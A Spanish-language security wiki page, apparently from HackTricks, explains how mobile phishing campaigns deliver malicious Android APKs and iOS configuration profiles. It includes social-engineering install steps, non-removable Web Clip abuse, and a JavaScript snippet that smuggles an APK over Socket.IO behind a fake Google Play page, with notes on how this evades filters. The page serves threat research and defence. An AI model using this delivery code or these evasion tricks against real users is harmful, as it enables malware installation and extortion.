# Phishing móvil y distribución de aplicaciones maliciosas (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas que los actores de amenazas usan para distribuir **APK maliciosas de Android** y **perfiles de configuración móvil de iOS** mediante phishing (SEO, ingeniería social, tiendas falsas, aplicaciones de citas, etc.).
> El material está adaptado de la campaña SarangTrap, expuesta por Zimperium zLabs (2025), y de otras investigaciones públicas.<sup>[[1]](#references)</sup>

## Flujo de ataque

1. **Infraestructura de SEO/phishing**
   * Registrar decenas de dominios similares (citas, almacenamiento en la nube, servicios de automóviles…).  
     – Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionarse en Google.  
     – Alojar las instrucciones de instalación para Android (`.apk`) y iOS en la misma página de destino.
2. **Descarga de primera etapa**
   * Android: enlace directo a un APK *sin firmar* o de una “tienda de terceros”.  
   * iOS: enlace `itms-services://` o HTTPS sin formato a un perfil **mobileconfig** malicioso (véase abajo).
3. **Comportamiento de Android tras la instalación**
   * La ejecución controlada por C2, el abuso de permisos, las técnicas para eludir los dropper, la recopilación en segundo plano y otros comportamientos de malware posteriores a la instalación se describen en la página dedicada a Android Malware Post-Exploitation, más abajo.
4. **Técnica de entrega para iOS**
   * Un único **perfil de configuración móvil** puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., para inscribir el dispositivo en una supervisión similar a “MDM”.  
   * Instrucciones de ingeniería social:
     1. Abrir Ajustes ➜ *Perfil descargado*.
     2. Tocar *Instalar* tres veces (con capturas de pantalla en la página de phishing).  
     3. Confiar en el perfil sin firmar ➜ el atacante obtiene permisos de *Contactos* y *Fotos* sin revisión de App Store.
5. **Payload Web Clip para iOS (icono de aplicación de phishing)**
   * Los payloads `com.apple.webClip.managed` pueden **fijar una URL de phishing en la pantalla de inicio** con un icono y una etiqueta personalizados.
   * Los Web Clips pueden ejecutarse **a pantalla completa** (ocultan la interfaz del navegador) y marcarse como **no eliminables**, lo que obliga a la víctima a borrar el perfil para quitar el icono.<sup>[[3]](#references)</sup>
6. **Capa de red**
   * HTTP sin cifrar, a menudo en el puerto 80, con un encabezado HOST como `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).

## Android Malware Post-Exploitation

Para conocer las tácticas de malware de Android posteriores a la instalación, como C2, abuso de Accessibility, overlays, automatización ATS, carga de DEX por etapas, SMS premium y persistencia, véase:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Contrabando de APK mediante Socket.IO/WebSocket + páginas falsas de Google Play

Los atacantes sustituyen cada vez más los enlaces estáticos a APK por un canal Socket.IO/WebSocket integrado en señuelos que parecen páginas de Google Play. Esto oculta la URL del payload, elude los filtros de URL/extensión y mantiene una experiencia de instalación realista.<sup>[[2]](#references)[[4]](#references)</sup>

Flujo típico del cliente observado en ataques reales:

<details>
<summary>Descargador falso de Play mediante Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Por qué evade los controles básicos:
- No se expone ninguna URL estática del APK; el payload se reconstruye en memoria a partir de tramas WebSocket.
- Los filtros de URL/MIME/extensión que bloquean respuestas directas .apk pueden pasar por alto datos binarios tunelizados mediante WebSockets/Socket.IO.
- Los crawlers y los sandboxes de URL que no ejecutan WebSockets no recuperarán el payload.

Consulta también tácticas y herramientas de WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [El lado oscuro del romance: campaña de extorsión SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ajustes del payload Web Clips para dispositivos Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Troyano bancario dirigido a usuarios de Android de Indonesia y Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
